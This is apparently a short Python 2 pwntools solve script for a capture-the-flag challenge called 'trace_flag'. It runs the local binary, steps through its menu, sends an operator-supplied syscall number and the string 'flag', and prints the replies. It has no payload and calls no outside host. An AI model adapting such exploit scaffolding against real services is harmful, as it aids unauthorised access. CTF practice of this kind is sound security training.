from pwn import *
import time

context.log_level='debug'

p = process("./trace_flag hack", shell=True)

p.send("\n")

print p.recv()
print p.recv()

p.sendline("1")
print p.recv()

p.sendline("0")
print p.recv()

syscall = raw_input("syscall?")
syscall = int(syscall, 16)

p.sendline(str(syscall))

print p.recv()

p.sendline("1")

time.sleep(0.5)

p.send("flag")

time.sleep(0.3)

print p.recv()

p.sendline("2")

time.sleep(0.2)

print p.recv()

p.sendline("3")

time.sleep(0.3)

print p.recv()
